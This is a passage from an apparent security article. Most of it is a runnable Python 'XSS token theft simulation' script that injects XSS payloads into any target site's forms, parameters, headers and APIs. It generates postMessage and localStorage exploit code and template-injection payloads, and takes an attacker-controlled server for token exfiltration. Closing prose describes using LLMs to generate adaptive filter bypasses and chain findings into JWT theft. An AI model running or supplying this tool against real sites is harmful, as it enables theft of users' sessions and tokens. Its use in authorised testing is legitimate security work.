        result['details'] = f"Found {len(result['vulnerable_patterns'])} dangerous DOM patterns"
    
    return result


def detect_security_header_weakness(response: 'requests.Response') -> dict:
    """
    Method 10: Security header analysis.
    Checks for missing or weak security headers that enable XSS.
    """
    result = {
        'method': 'security_headers', 
        'detected': False, 
        'confidence': 'low',
        'missing_headers': [],
        'weak_headers': []
    }
    
    headers = {k.lower(): v for k, v in response.headers.items()}
    
    # Check Content-Security-Policy
    csp = headers.get('content-security-policy', '')
    if not csp:
        result['missing_headers'].append('Content-Security-Policy')
    elif 'unsafe-inline' in csp or 'unsafe-eval' in csp:
        result['weak_headers'].append({
            'header': 'Content-Security-Policy',
            'issue': 'Contains unsafe-inline or unsafe-eval'
        })
    
    # Check X-XSS-Protection (legacy but still relevant)
    xss_protection = headers.get('x-xss-protection', '')
    if not xss_protection or xss_protection == '0':
        result['missing_headers'].append('X-XSS-Protection')
    
    # Check X-Content-Type-Options
    if 'x-content-type-options' not in headers:
        result['missing_headers'].append('X-Content-Type-Options')
    
    # Check for reflected content type
    content_type = headers.get('content-type', '')
    if 'text/html' in content_type and 'charset' not in content_type.lower():
        result['weak_headers'].append({
            'header': 'Content-Type',
            'issue': 'Missing charset - potential encoding attack vector'
        })
    
    if result['missing_headers'] or result['weak_headers']:
        result['detected'] = True
        result['confidence'] = 'medium'
        result['details'] = f"{len(result['missing_headers'])} missing, {len(result['weak_headers'])} weak headers"
    
    return result

# =============================================================================
# CATEGORY-SPECIFIC XSS TESTING FUNCTIONS
# Each function uses specialized detection techniques for its injection type
# =============================================================================


def test_form_xss(target_url: str, form_data: dict, payload: str, 
                  session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 1: Form-based XSS testing.
    Tests form submissions for reflected and stored XSS.
    
    TESTING MODE: DIRECT - This function sends actual HTTP requests and analyzes
    the response for payload reflection. No manual browser testing required for
    initial detection, though browser verification is recommended for confirmation.
    """
    result = {
        'category': 'form',
        'url': form_data.get('action', target_url),
        'method': form_data.get('method', 'GET'),
        'payload': payload[:50] + '...' if len(payload) > 50 else payload,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False
    }
    
    try:
        # Prepare form data with payload
        post_data = {}
        for input_field in form_data.get('inputs', []):
            if input_field.get('injectable', True):
                post_data[input_field['name']] = payload
            else:
                post_data[input_field['name']] = input_field.get('value', '')
        
        # Submit form
        if form_data.get('method', 'GET').upper() == 'POST':
            response = session.post(form_data.get('action', target_url), 
                                   data=post_data, timeout=15)
        else:
            response = session.get(form_data.get('action', target_url), 
                                  params=post_data, timeout=15)
        
        # Run detection methods appropriate for forms
        result['detection_methods'].append(detect_exact_reflection(payload, response.text))
        result['detection_methods'].append(detect_url_encoded_reflection(payload, response.text))
        result['detection_methods'].append(detect_html_entity_reflection(payload, response.text))
        result['detection_methods'].append(detect_context_aware_reflection(payload, response.text))
        result['detection_methods'].append(detect_partial_reflection(payload, response.text))
        result['detection_methods'].append(detect_security_header_weakness(response))
        
        # Aggregate results
        result = aggregate_detection_results(result)
        
    except requests.RequestException as e:
        logger.error(f"Form XSS test error: {e}")
        result['error'] = str(e)
    
    return result


def test_url_param_xss(target_url: str, param_data: dict, payload: str,
                       session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 2: URL parameter XSS testing.
    Tests query string parameters for reflected XSS.
    
    TESTING MODE: DIRECT - This function sends actual HTTP requests with payloads
    in URL parameters and analyzes the response for reflection. Automated detection
    via HTTP response analysis, no manual browser interaction needed for detection.
    """
    from urllib.parse import urlparse, urlencode, urlunparse, parse_qs
    
    result = {
        'category': 'url_parameter',
        'parameter': param_data.get('name', 'unknown'),
        'url': param_data.get('url', target_url),
        'payload': payload[:50] + '...' if len(payload) > 50 else payload,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False
    }
    
    try:
        # Parse URL and inject payload into parameter
        parsed = urlparse(param_data.get('url', target_url))
        existing_params = parse_qs(parsed.query)
        
        # Add/replace the target parameter with payload
        existing_params[param_data.get('name', 'q')] = [payload]
        
        # Rebuild URL
        new_query = urlencode(existing_params, doseq=True)
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        
        response = session.get(test_url, timeout=15)
        
        # Run URL-specific detection methods
        result['detection_methods'].append(detect_exact_reflection(payload, response.text))
        result['detection_methods'].append(detect_url_encoded_reflection(payload, response.text))
        result['detection_methods'].append(detect_context_aware_reflection(payload, response.text))
        result['detection_methods'].append(detect_error_based_reflection(payload, response))
        
        # Check if payload appears in URL of response (open redirect + XSS combo)
        if payload in response.url or payload.replace('<', '%3C') in response.url:
            result['detection_methods'].append({
                'method': 'url_reflection',
                'detected': True,
                'confidence': 'high',
                'details': 'Payload reflected in response URL'
            })
        
        result = aggregate_detection_results(result)
        
    except requests.RequestException as e:
        logger.error(f"URL param XSS test error: {e}")
        result['error'] = str(e)
    
    return result


def test_header_xss(target_url: str, header_data: dict, payload: str,
                    session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 3: HTTP header injection XSS testing.
    Tests if headers are reflected in responses.
    
    TESTING MODE: DIRECT - This function sends HTTP requests with payloads in
    custom headers and checks if they are reflected in the response body or headers.
    Automated detection via HTTP response analysis.
    """
    result = {
        'category': 'header',
        'header': header_data.get('header', header_data.get('name', 'unknown')),
        'url': target_url,
        'payload': payload[:50] + '...' if len(payload) > 50 else payload,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False
    }
    
    try:
        # Create custom headers with payload
        custom_headers = {
            header_data.get('header', header_data.get('name', 'X-Test')): payload
        }
        
        response = session.get(target_url, headers=custom_headers, timeout=15)
        
        # Check if header value is reflected
        result['detection_methods'].append(detect_exact_reflection(payload, response.text))
        result['detection_methods'].append(detect_html_entity_reflection(payload, response.text))
        
        # Check response headers for reflection
        for key, value in response.headers.items():
            if payload in value or payload.replace('<', '&lt;') in value:
                result['detection_methods'].append({
                    'method': 'header_response_reflection',
                    'detected': True,
                    'confidence': 'medium',
                    'details': f'Payload reflected in response header: {key}'
                })
        
        result = aggregate_detection_results(result)
        
    except requests.RequestException as e:
        logger.error(f"Header XSS test error: {e}")
        result['error'] = str(e)
    
    return result


def test_api_xss(target_url: str, api_data: dict, payload: str,
                 session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 9: API endpoint XSS testing.
    Tests JSON APIs for reflected content in responses.
    
    TESTING MODE: DIRECT - This function sends actual HTTP requests to API endpoints
    with payloads in JSON body and analyzes the response for reflection. Automated
    detection, though DOM rendering of API responses may need browser verification.
    """
    import json as json_lib
    from urllib.parse import urljoin
    
    result = {
        'category': 'api_endpoint',
        'endpoint': api_data.get('endpoint', 'unknown'),
        'url': target_url,
        'payload': payload[:50] + '...' if len(payload) > 50 else payload,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False
    }
    
    try:
        endpoint = api_data.get('endpoint', '')
        if not endpoint.startswith('http'):
            endpoint = urljoin(target_url, endpoint)
        
        # Test with query parameter
        response = session.get(endpoint, params={'q': payload, 'search': payload}, timeout=15)
        
        # Check for reflection in response body
        result['detection_methods'].append(detect_exact_reflection(payload, response.text))
        
        # Check if JSON response contains unescaped payload
        try:
            json_response = response.json()
            json_str = json_lib.dumps(json_response)
            if payload in json_str:
                result['detection_methods'].append({
                    'method': 'json_reflection',
                    'detected': True,
                    'confidence': 'high',
                    'details': 'Payload reflected in JSON response unescaped'
                })
        except:
            pass
        
        # Check Content-Type - XSS in JSON with wrong content-type
        content_type = response.headers.get('Content-Type', '')
        if 'text/html' in content_type and payload in response.text:
            result['detection_methods'].append({
                'method': 'content_type_mismatch',
                'detected': True,
                'confidence': 'high',
                'details': 'API returns text/html - direct XSS possible'
            })
        
        result = aggregate_detection_results(result)
        
    except requests.RequestException as e:
        logger.error(f"API XSS test error: {e}")
        result['error'] = str(e)
    
    return result


def test_file_upload_xss(target_url: str, upload_data: dict, payload: str,
                         session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 6: File upload XSS testing.
    Tests file upload for XSS via filename and SVG/HTML content.
    
    TESTING MODE: MANUAL REQUIRED - This function DOES NOT actually upload files.
    It analyzes the file input fields and generates malicious payloads (SVG with
    onload, HTML with script, malicious filenames) that you must manually upload
    and verify if they execute in the browser when viewed/rendered.
    """
    result = {
        'category': 'file_upload',
        'input_name': upload_data.get('name', 'unknown'),
        'url': target_url,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False,
        'test_type': 'simulation'  # Actual upload requires manual testing
    }
    
    # Determine attack vectors based on accept attribute
    vectors = upload_data.get('vectors', [])
    accept = upload_data.get('accept', '')
    
    vulnerabilities = []
    
    # SVG XSS vector
    if 'svg_xss' in vectors or not accept or 'svg' in accept:
        svg_payload = f'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg onload="{payload}" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="20">XSS Test</text>
</svg>'''
        vulnerabilities.append({
            'vector': 'svg_xss',
            'payload': svg_payload[:100] + '...',
            'description': 'SVG file with onload event handler'
        })
    
    # HTML upload vector
    if 'html_upload' in vectors or 'html' in accept:
        html_payload = f'''<!DOCTYPE html>
<html><body>
<script>{payload}</script>
</body></html>'''
        vulnerabilities.append({
            'vector': 'html_upload',
            'payload': html_payload[:100] + '...',
            'description': 'HTML file with embedded script'
        })
    
    # Filename XSS
    if 'filename_xss' in vectors or not accept:
        filename_payload = f'"><img src=x onerror=alert(1)>.jpg'
        vulnerabilities.append({
            'vector': 'filename_xss',
            'payload': filename_payload,
            'description': 'Malicious filename that may be reflected'
        })
    
    if vulnerabilities:
        result['detection_methods'].append({
            'method': 'file_upload_vectors',
            'detected': True,
            'confidence': 'medium',
            'details': f'{len(vulnerabilities)} potential vectors identified',
            'vectors': vulnerabilities
        })
        result['requires_manual_test'] = True
    
    result = aggregate_detection_results(result)
    return result


def test_websocket_xss(target_url: str, ws_data: dict, payload: str,
                       session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 5: WebSocket XSS testing.
    Analyzes WebSocket configuration for potential XSS via message injection.
    
    TESTING MODE: MANUAL REQUIRED - This function analyzes WebSocket configuration
    but does NOT establish actual WebSocket connections. It identifies insecure
    ws:// endpoints and message handlers. Manual browser testing with DevTools or
    a WebSocket client is needed to inject payloads and verify execution.
    """
    result = {
        'category': 'websocket',
        'ws_url': ws_data.get('url', 'unknown'),
        'library': ws_data.get('library', ws_data.get('type', 'unknown')),
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False,
        'requires_browser_test': True
    }
    
    # WebSocket testing requires actual WS connection
    # Analyze configuration for potential vulnerabilities
    
    ws_url = ws_data.get('url', '')
    
    # Check for insecure WebSocket (ws:// instead of wss://)
    if ws_url.startswith('ws://'):
        result['detection_methods'].append({
            'method': 'insecure_websocket',
            'detected': True,
            'confidence': 'high',
            'details': 'WebSocket uses unencrypted ws:// protocol - MITM possible'
        })
    
    # Check if message handlers exist
    if ws_data.get('type') == 'websocket_handler':
        result['detection_methods'].append({
            'method': 'message_handler_present',
            'detected': True,
            'confidence': 'medium',
            'details': 'WebSocket message handler found - test message injection'
        })
    
    result['test_payload'] = f'''
// WebSocket XSS Test Payload
var ws = new WebSocket("{ws_url}");
ws.onopen = function() {{
    ws.send('{payload}');
}};
'''
    
    result = aggregate_detection_results(result)
    return result


def test_postmessage_xss(target_url: str, pm_data: dict, payload: str,
                         session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 7: postMessage XSS testing.
    Tests for DOM XSS via window.postMessage without origin validation.
    
    TESTING MODE: MANUAL REQUIRED - This function analyzes JavaScript code for
    postMessage listeners without origin validation. It generates an exploit HTML
    page (in result['exploit_html']) that you must host and open in a browser.
    The exploit sends a malicious postMessage to the target iframe.
    """
    result = {
        'category': 'postmessage',
        'has_origin_validation': pm_data.get('has_origin_validation', False),
        'url': target_url,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False,
        'requires_browser_test': True
    }
    
    # Check for missing origin validation - CRITICAL vulnerability
    if not pm_data.get('has_origin_validation', True):
        result['detection_methods'].append({
            'method': 'missing_origin_check',
            'detected': True,
            'confidence': 'high',
            'details': 'postMessage listener has NO origin validation - CRITICAL'
        })
        result['exploitable'] = True
        
        # Generate exploit payload
        result['exploit_html'] = f'''
<!DOCTYPE html>
<html>
<body>
<iframe id="target" src="{target_url}"></iframe>
<script>
// Wait for iframe to load
document.getElementById('target').onload = function() {{
    // Send malicious message - no origin check on receiver
    this.contentWindow.postMessage('{payload}', '*');
}};
</script>
</body>
</html>'''
    
    result = aggregate_detection_results(result)
    return result


def test_template_xss(target_url: str, template_data: dict, payload: str,
                      session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 8: Template injection XSS testing.
    Tests for client-side and server-side template injection.
    
    TESTING MODE: HYBRID - This function sends HTTP requests with template payloads
    (like {{7*7}}) and checks if they evaluate (49 appears). SSTI detection is
    automated. However, CSTI (client-side) in frameworks like Angular/Vue requires
    browser testing to see if template expressions execute in the DOM.
    """
    result = {
        'category': 'template',
        'template_type': template_data.get('template_type', 'unknown'),
        'url': target_url,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False
    }
    
    template_type = template_data.get('template_type', '')
    
    # Generate template-specific payloads
    template_payloads = {
        'angular/vue': '{{constructor.constructor("alert(1)")()}}',
        'vue_v-html': payload,  # v-html directly renders HTML
        'angular_bind': payload,
        'react_dangerous': payload,
        'innerHTML': payload,
        'document_write': payload,
        'jinja/django': '{{config}}{{self.__class__.__mro__}}',
        'jsp/asp': '<%=Runtime.getRuntime().exec("id")%>',
    }
    
    # Check for dangerous patterns
    if template_type in ['vue_v-html', 'angular_bind', 'react_dangerous', 
                         'innerHTML', 'outerHTML', 'document_write', 'insertAdjacentHTML']:
        result['detection_methods'].append({
            'method': 'dangerous_sink',
            'detected': True,
            'confidence': 'high',
            'details': f'{template_type} is a dangerous sink - direct XSS if user input reaches it'
        })
        result['exploitable'] = True
    
    # Try to test template injection via URL/form
    try:
        test_payload = template_payloads.get(template_type, '{{7*7}}')
        response = session.get(target_url, params={'q': test_payload}, timeout=15)
        
        # Check for template evaluation (e.g., {{7*7}} becomes 49)
        if '49' in response.text and '7*7' not in response.text:
            result['detection_methods'].append({
                'method': 'template_evaluation',
                'detected': True,
                'confidence': 'high',
                'details': 'Template expression was evaluated - SSTI/CSTI confirmed'
            })
            result['exploitable'] = True
            
    except requests.RequestException as e:
        logger.debug(f"Template test request failed: {e}")
    
    result = aggregate_detection_results(result)
    return result


def test_fragment_xss(target_url: str, fragment_data: dict, payload: str,
                      session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 10: URL fragment/hash XSS testing.
    Tests for DOM XSS via location.hash.
    
    TESTING MODE: MANUAL REQUIRED - This function analyzes JavaScript code for
    location.hash usage and dangerous sinks, but does NOT execute in a browser.
    It generates a test URL (result['test_url']) with the payload in the hash.
    You must open this URL in a browser to verify if XSS executes.
    """
    result = {
        'category': 'fragment',
        'pattern': fragment_data.get('pattern', 'unknown'),
        'dangerous_sink': fragment_data.get('dangerous_sink', fragment_data.get('dangerous_sink_nearby', False)),
        'url': target_url,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False,
        'requires_browser_test': True
    }
    
    # Check if hash is used with dangerous sink
    if fragment_data.get('dangerous_sink', fragment_data.get('dangerous_sink_nearby', False)):
        result['detection_methods'].append({
            'method': 'hash_to_sink',
            'detected': True,
            'confidence': 'high',
            'details': 'location.hash flows to dangerous sink (innerHTML, eval, etc.) - DOM XSS likely'
        })
        result['exploitable'] = True
        
        # Generate test URL
        result['test_url'] = f'{target_url}#{payload}'
        result['exploit_note'] = 'Open test_url in browser - payload should execute'
    
    # Even without dangerous sink, hash handling can be dangerous
    if fragment_data.get('pattern') in ['location.hash', 'hashchange_event']:
        result['detection_methods'].append({
            'method': 'hash_handling',
            'detected': True,
            'confidence': 'medium',
            'details': 'Page processes location.hash - test for DOM XSS'
        })
    
    result = aggregate_detection_results(result)
    return result


def test_storage_xss(target_url: str, storage_data: dict, payload: str,
                     session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 11: Browser storage XSS testing.
    Tests for DOM XSS via localStorage/sessionStorage data rendering.
    
    TESTING MODE: MANUAL REQUIRED - This function analyzes code for unsafe
    rendering of storage data but cannot inject into browser storage remotely.
    It generates exploit code (result['exploit_code']) to run in browser console.
    You must manually execute this in DevTools and reload the page to test.
    """
    result = {
        'category': 'storage',
        'storage_type': storage_data.get('storage_type', 'unknown'),
        'key': storage_data.get('key', 'unknown'),
        'rendered_unsafely': storage_data.get('rendered_unsafely', False),
        'url': target_url,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False,
        'requires_browser_test': True
    }
    
    # Check if storage data is rendered unsafely
    if storage_data.get('rendered_unsafely', False):
        result['detection_methods'].append({
            'method': 'storage_to_dom',
            'detected': True,
            'confidence': 'high',
            'details': f'Data from {storage_data.get("storage_type")}["{storage_data.get("key")}"] rendered via innerHTML - DOM XSS'
        })
        result['exploitable'] = True
        
        # Generate browser console exploit
        storage_type = storage_data.get('storage_type', 'localStorage').split('_')[0]
        key = storage_data.get('key', 'data')
        result['exploit_code'] = f'''
// Run in browser console on {target_url}
{storage_type}.setItem("{key}", '{payload}');
location.reload();  // Payload executes on reload
'''
    
    # Token storage is always interesting
    if storage_data.get('type') == 'storage_token':
        result['detection_methods'].append({
            'method': 'token_in_storage',
            'detected': True,
            'confidence': 'medium',
            'details': f'JWT/token stored in browser storage - XSS can steal it'
        })
    
    result = aggregate_detection_results(result)
    return result


def test_event_handler_xss(target_url: str, event_data: dict, payload: str,
                           session: requests.Session, baseline_time: float = None) -> dict:
    """
    Category 4: Event handler XSS testing.
    Analyzes inline event handlers for potential exploitation.
    
    TESTING MODE: MANUAL REQUIRED - This function statically analyzes inline
    event handler code (onclick, onerror, etc.) for dangerous patterns like
    eval() or innerHTML. It does NOT trigger these handlers. Manual browser
    interaction is needed to trigger events and verify if XSS executes.
    """
    result = {
        'category': 'event_handler',
        'element': event_data.get('element', 'unknown'),
        'event': event_data.get('event', event_data.get('handler', 'unknown')),
        'url': target_url,
        'success': False,
        'reflected': False,
        'detection_methods': [],
        'overall_confidence': 'none',
        'exploitable': False,
        'requires_browser_test': True
    }
    
    handler_code = event_data.get('code', event_data.get('handler_code', ''))
    
    # Check for dangerous patterns in event handler
    dangerous_patterns = ['eval', 'innerHTML', 'document.write', 'location', 'setTimeout', 'setInterval']
    found_dangerous = [p for p in dangerous_patterns if p in handler_code]
    
    if found_dangerous:
        result['detection_methods'].append({
            'method': 'dangerous_handler',
            'detected': True,
            'confidence': 'high',
            'details': f'Event handler contains dangerous code: {", ".join(found_dangerous)}'
        })
        result['exploitable'] = True
    
    # If handler takes user input, it's potentially exploitable
    if 'value' in handler_code or 'input' in handler_code or 'data' in handler_code:
        result['detection_methods'].append({
            'method': 'user_input_in_handler',
            'detected': True,
            'confidence': 'medium',
            'details': 'Event handler may process user input'
        })
    
    result = aggregate_detection_results(result)
    return result


def aggregate_detection_results(result: dict) -> dict:
    """
    Helper function to aggregate detection method results into overall verdict.
    """
    detections = [m for m in result.get('detection_methods', []) if m.get('detected')]
    high_confidence = sum(1 for m in detections if m.get('confidence') == 'high')
    medium_confidence = sum(1 for m in detections if m.get('confidence') == 'medium')
    
    if high_confidence >= 1:
        result['success'] = True
        result['reflected'] = True
        result['overall_confidence'] = 'high'
        result['exploitable'] = True
    elif medium_confidence >= 2:
        result['success'] = True
        result['reflected'] = True
        result['overall_confidence'] = 'medium'
        result['exploitable'] = True
    elif len(detections) >= 1:
        result['reflected'] = True
        result['overall_confidence'] = 'low'
    
    return result


def test_xss_injection(target_url: str, injection_data: dict, payload: str,
                       session: requests.Session, baseline_time: float = None,
                       category: str = None) -> dict:
    """
    Master XSS testing dispatcher.
    Routes to category-specific testing function based on injection type.
    """
    # Determine category from data or parameter
    detected_category = category or injection_data.get('type', injection_data.get('category', 'form'))
    
    # Map category to test function
    category_tests = {
        'form': test_form_xss,
        'url_parameter': test_url_param_xss,
        'path_segment': test_url_param_xss,
        'http_header': test_header_xss,
        'header': test_header_xss,
        'event_handler': test_event_handler_xss,
        'websocket': test_websocket_xss,
        'websocket_handler': test_websocket_xss,
        'file_upload': test_file_upload_xss,
        'postmessage': test_postmessage_xss,
        'postmessage_listener': test_postmessage_xss,
        'postmessage_sender': test_postmessage_xss,
        'template': test_template_xss,
        'server_template': test_template_xss,
        'api_endpoint': test_api_xss,
        'fragment': test_fragment_xss,
        'storage': test_storage_xss,
        'storage_token': test_storage_xss,
    }
    
    # Get appropriate test function
    test_func = category_tests.get(detected_category, test_form_xss)
    
    # Run the category-specific test
    result = test_func(target_url, injection_data, payload, session, baseline_time)
    
    # Ensure category is set in result
    if 'category' not in result:
        result['category'] = detected_category
    
    # Log result
    if result.get('success'):
        logger.warning(f"[{detected_category.upper()}] XSS vulnerability detected! "
                      f"Confidence: {result.get('overall_confidence')}")
    
    return result



def run_xss_simulation(target_url: str, attacker_server: str):
    """
    Main function to run comprehensive XSS token theft simulation.
    Tests all 11 categories of injection points with multiple detection methods.
    """
    logger.info(f"=" * 60)
    logger.info(f"COMPREHENSIVE XSS TOKEN THEFT SIMULATION")
    logger.info(f"=" * 60)
    logger.info(f"Target URL: {target_url}")
    logger.info(f"Exfiltration server: {attacker_server}")
    
    # Create a session for consistent cookies/headers
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Get baseline response time for timing-based detection
    try:
        baseline_response = session.get(target_url, timeout=10)
        baseline_time = baseline_response.elapsed.total_seconds()
        logger.info(f"Baseline response time: {baseline_time:.2f}s")
    except:
        baseline_time = None
    
    # Step 1: Find ALL injection points across all categories
    logger.info(f"\n[STEP 1] Discovering injection points...")
    injection_points = find_injection_points(target_url, session)
    
    if not injection_points or injection_points.get('summary', {}).get('grand_total', 0) == 0:
        logger.warning("No injection points found. Manual testing may be required.")
        return {'success': False, 'reason': 'no_injection_points'}
    
    # Log summary of found injection points
    summary = injection_points.get('summary', {})
    logger.info(f"\n[INJECTION POINTS DISCOVERED]")
    for category, count in summary.items():
        if count > 0 and category != 'grand_total':
            logger.info(f"  {category}: {count}")
    logger.info(f"  TOTAL: {summary.get('grand_total', 0)}")
    
    # Step 2: Generate XSS payloads
    logger.info(f"\n[STEP 2] Generating XSS payloads...")
    payloads = generate_xss_payloads(attacker_server)
    logger.info(f"Generated {len(payloads)} payload variants")
    
    # Step 3: Test each category with appropriate payloads
    logger.info(f"\n[STEP 3] Testing injection points...")
    all_results = {
        'forms': [],
        'url_parameters': [],
        'headers': [],
        'event_handlers': [],
        'websockets': [],
        'file_uploads': [],
        'postmessage': [],
        'templates': [],
        'api_endpoints': [],
        'fragments': [],
        'storage': [],
        'summary': {}
    }
    
    # Test FORMS (Category 1) - Traditional form-based XSS
    if injection_points.get('forms'):
        logger.info(f"\n  Testing FORMS ({len(injection_points['forms'])} points)...")
        for form_data in injection_points['forms']:
            for payload in payloads:
                result = test_xss_injection(target_url, form_data, payload, session, baseline_time)
                result['category'] = 'form'
                all_results['forms'].append(result)
                if result['success']:
                    logger.warning(f"    ✓ VULNERABLE: {form_data.get('action', 'unknown')}")
    
    # Test URL PARAMETERS (Category 2) - Reflected XSS via query strings
    if injection_points.get('url_parameters'):
        logger.info(f"\n  Testing URL PARAMETERS ({len(injection_points['url_parameters'])} points)...")
        for param in injection_points['url_parameters']:
            # Create a pseudo form_data structure for URL parameter testing
            param_form = {
                'action': param.get('url', target_url),
                'method': 'GET',
                'inputs': [{'name': param.get('name', 'q'), 'injectable': True}]
            }
            for payload in payloads[:3]:  # Test top 3 payloads for speed
                result = test_xss_injection(target_url, param_form, payload, session, baseline_time)
                result['category'] = 'url_parameter'
                result['parameter'] = param.get('name')
                all_results['url_parameters'].append(result)
                if result['success']:
                    logger.warning(f"    ✓ VULNERABLE: param '{param.get('name')}'")
    
    # Test HEADERS (Category 3) - Header injection
    if injection_points.get('headers'):
        logger.info(f"\n  Testing HTTP HEADERS ({len(injection_points['headers'])} potential)...")
        for header in injection_points['headers'][:5]:  # Test top 5 headers
            # Note: Full header injection testing requires sending requests with modified headers
            result = {
                'category': 'header',
                'header': header.get('header'),
                'risk': header.get('risk'),
                'requires_manual_test': True,
                'description': header.get('description')
            }
            all_results['headers'].append(result)
        logger.info(f"    → Header injection requires manual testing with modified request headers")
    
    # Test API ENDPOINTS (Category 9) - API-based reflection
    if injection_points.get('api_endpoints'):
        logger.info(f"\n  Testing API ENDPOINTS ({len(injection_points['api_endpoints'])} points)...")
        for endpoint in injection_points['api_endpoints'][:5]:
            api_form = {
                'action': endpoint.get('endpoint', ''),
                'method': 'GET',
                'inputs': [{'name': 'q', 'injectable': True}]
            }
            for payload in payloads[:2]:
                result = test_xss_injection(target_url, api_form, payload, session, baseline_time)
                result['category'] = 'api_endpoint'
                result['endpoint'] = endpoint.get('endpoint')
                all_results['api_endpoints'].append(result)
                if result['success']:
                    logger.warning(f"    ✓ VULNERABLE: {endpoint.get('endpoint')}")
    
    # Log findings for DOM-based categories (require client-side testing)
    dom_categories = ['event_handlers', 'websockets', 'postmessage', 'templates', 'fragments', 'storage']
    for category in dom_categories:
        if injection_points.get(category):
            points = injection_points[category]
            logger.info(f"\n  Found {len(points)} {category.upper()} points (requires browser-based testing)")
            for point in points[:3]:  # Show top 3
                risk = point.get('risk', 'unknown')
                desc = point.get('type', point.get('pattern', point.get('template_type', 'N/A')))
                all_results[category].append({
                    'category': category,
                    'type': desc,
                    'risk': risk,
                    'requires_browser_test': True,
                    'details': point
                })
                if risk in ['critical', 'high']:
                    logger.warning(f"    ⚠ HIGH RISK: {desc} (Risk: {risk})")
    
    # File uploads
    if injection_points.get('file_uploads'):
        logger.info(f"\n  Found {len(injection_points['file_uploads'])} FILE UPLOAD points")
        for upload in injection_points['file_uploads']:
            all_results['file_uploads'].append({
                'category': 'file_upload',
                'name': upload.get('name'),
                'vectors': upload.get('vectors', []),
                'risk': upload.get('risk'),
                'requires_manual_test': True
            })
            logger.info(f"    → {upload.get('name')}: vectors = {upload.get('vectors', [])}")
    
    # ===== GENERATE FINAL SUMMARY =====
    logger.info(f"\n" + "=" * 60)
    logger.info(f"SIMULATION RESULTS SUMMARY")
    logger.info(f"=" * 60)
    
    # Count successes by category
    total_tests = 0
    total_vulnerable = 0
    high_risk_findings = []
    
    for category, results in all_results.items():
        if category == 'summary':
            continue
        if results:
            vulnerable = sum(1 for r in results if r.get('success', False))
            exploitable = sum(1 for r in results if r.get('exploitable', False))
            total_tests += len(results)
            total_vulnerable += vulnerable
            
            if vulnerable > 0:
                logger.warning(f"  {category}: {vulnerable}/{len(results)} VULNERABLE")
                high_risk_findings.extend([r for r in results if r.get('success')])
            else:
                # Check for high-risk DOM-based findings
                high_risk = [r for r in results if r.get('risk') in ['critical', 'high']]
                if high_risk:
                    logger.info(f"  {category}: {len(high_risk)} high-risk points (needs browser test)")
    
    all_results['summary'] = {
        'total_tests': total_tests,
        'total_vulnerable': total_vulnerable,
        'high_risk_findings': len(high_risk_findings),
        'categories_tested': len([c for c, r in all_results.items() if r and c != 'summary'])
    }
    
    logger.info(f"\n  TOTAL: {total_vulnerable}/{total_tests} confirmed vulnerable endpoints")
    logger.info(f"  High-risk findings requiring attention: {len(high_risk_findings)}")
    
    if high_risk_findings:
        logger.warning(f"\n[!] ACTION REQUIRED: {len(high_risk_findings)} exploitable XSS vulnerabilities found!")
    else:
        logger.info(f"\n[✓] No immediately exploitable vulnerabilities confirmed via automated testing")
        logger.info(f"    Note: DOM-based vulnerabilities require browser-based testing")
    
    return all_results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Token Theft Simulation")
    parser.add_argument("--target", required=True, help="Target URL to test")
    parser.add_argument("--attacker-server", required=True, 
                        help="Attacker controlled server URL for token exfiltration")
    args = parser.parse_args()
    
    run_xss_simulation(args.target, args.attacker_server)
```

#### AI-ML-Enhanced Attack Techniques

**1. LLM-Enhanced XSS Testing Script: Intelligent Automation Beyond Static Analysis**

The standard Python XSS testing script presented above provides robust category-specific vulnerability detection across 11 injection point types, but integrating Large Language Models (LLMs) transforms it from a rule-based scanner into an intelligent, adaptive security testing platform. While traditional detection methods rely on pattern matching and predefined signatures, LLM integration enables the script to understand context semantically, reason about code behavior, and generate creative bypass strategies that evolve with each test iteration. The enhancement focuses on augmenting each category-specific testing function with LLM-powered analysis: forms benefit from intelligent field prioritization based on surrounding HTML context; URL parameters gain adaptive payload generation that learns from sanitization responses; event handlers receive code-level analysis that traces data flow to dangerous sinks; and template injection tests leverage LLM knowledge of framework-specific vulnerabilities across Angular, Vue, React, and server-side engines. The LLM acts as an expert security researcher embedded within the script, analyzing response content to determine why payloads succeeded or failed and automatically generating optimized bypass attempts. Beyond individual test enhancement, LLMs enable cross-category attack chain synthesis—identifying how a reflected XSS finding combined with missing origin validation on postMessage handlers could escalate to full JWT token theft. The result is a testing framework that provides not just vulnerability detection, but exploitation guidance, remediation recommendations, and executive-ready reporting—transforming raw scan data into actionable security intelligence.

**LLM Enhancement 1: Intelligent Injection Point Discovery**

